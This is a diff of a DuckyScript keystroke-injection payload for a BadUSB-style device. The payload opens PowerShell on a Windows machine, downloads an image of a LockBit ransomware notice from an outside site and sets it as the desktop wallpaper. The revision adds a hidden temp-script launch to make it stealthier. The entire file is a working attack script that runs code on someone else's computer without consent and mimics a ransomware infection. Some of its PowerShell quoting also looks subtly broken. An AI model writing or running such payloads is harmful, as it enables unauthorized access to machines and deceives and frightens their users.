@@ -1,40 +1,46 @@
-DELAY 1000
+REM Open PowerShell
 GUI r
-DELAY 500
-STRING powershell -w hidden
+DELAY 300
+STRING powershell
 ENTER
 DELAY 500
 
-REM Start actual script
-STRING $i='https://cyble.com/wp-content/uploads/2021/08/Cyble-LOCKBIT-Ransomware-Windows-darkweb-LOCKBIT-2.0-Changing-Desktop-Background.png';
+REM Build script line by line
+STRING $s = "$imageUrl = 'https://cyble.com/wp-content/uploads/2021/08/Cyble-LOCKBIT-Ransomware-Windows-darkweb-LOCKBIT-2.0-Changing-Desktop-Background.png';"
 ENTER
-STRING $u=$env:USERNAME;
+STRING $s += "$username = $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]);"
 ENTER
-STRING $p="C:\Users\$u\Pictures\dl.jpg";
+STRING $s += "$imagePath = \"C:\Users\$username\Pictures\downloaded_image.jpg\";"
 ENTER
-STRING Invoke-WebRequest -Uri $i -OutFile $p;
+STRING $s += "Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath;"
 ENTER
-STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers' -Name BackgroundType -Value 1;
+STRING $s += "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Wallpapers' -Name BackgroundType -Value 1;"
 ENTER
-STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name Wallpaper -Value $p;
+STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'Wallpaper' -Value $imagePath;"
 ENTER
-STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name WallpaperStyle -Value 2;
+STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'WallpaperStyle' -Value 2;"
 ENTER
-STRING Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name TileWallpaper -Value 0;
+STRING $s += "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'TileWallpaper' -Value 0;"
 ENTER
-STRING Add-Type -TypeDefinition @"
+STRING $s += 'Add-Type -TypeDefinition @"'
 ENTER
-STRING using System;
+STRING $s += 'using System;'
 ENTER
-STRING using System.Runtime.InteropServices;
+STRING $s += 'using System.Runtime.InteropServices;'
 ENTER
-STRING public class W {
+STRING $s += 'public class Wallpaper {'
 ENTER
-STRING [DllImport("user32.dll")] public static extern int SystemParametersInfo(int a, int b, string c, int d);
+STRING $s += '    [DllImport("user32.dll", CharSet = CharSet.Auto)]'
 ENTER
-STRING }
+STRING $s += '    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);'
 ENTER
-STRING "@;
+STRING $s += '}'
 ENTER
-STRING [W]::SystemParametersInfo(20, 0, $p, (0x01 -bor 0x02));
+STRING $s += '"@;'
+ENTER
+STRING $s += '[Wallpaper]::SystemParametersInfo(20, 0, $imagePath, 0x01 -bor 0x02);'
+ENTER
+
+REM Write it to a temp script and run hidden
+STRING $f = "$env:TEMP\w.ps1"; Set-Content $f $s; Start-Process powershell -WindowStyle Hidden -ArgumentList "-File `"$f`""
 ENTER
